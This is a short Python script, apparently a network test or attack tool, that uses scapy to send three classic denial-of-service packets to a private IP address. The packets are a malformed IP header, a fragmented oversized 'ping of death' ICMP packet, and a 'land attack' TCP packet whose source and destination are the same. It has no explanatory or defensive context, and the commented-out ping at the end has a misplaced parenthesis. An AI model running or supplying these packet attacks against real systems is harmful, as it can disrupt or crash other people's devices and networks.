#! /usr/bin/env python3

import sys
from scapy3k.all import fragment,send,sr1,IP,ICMP,TCP

dest_ip = "192.168.2.1"

# malformed packet (IP version 3)
print("Malformed packet")
p = send(IP(dst=dest_ip, ihl=2, version=3)/ICMP())

# ping of death (large payload)
print("Ping of Death")
p = send(fragment(IP(dst=dest_ip)/ICMP()/("X"*60000)))

# Land Attack (src and target are the same)
print("Land Attack")
p = send(IP(src=dest_ip,dst=dest_ip)/TCP(sport=135,dport=135))


# regular ping
#p=sr1(IP(dst=dest_ip/ICMP()))
#if p:
#    p.show()


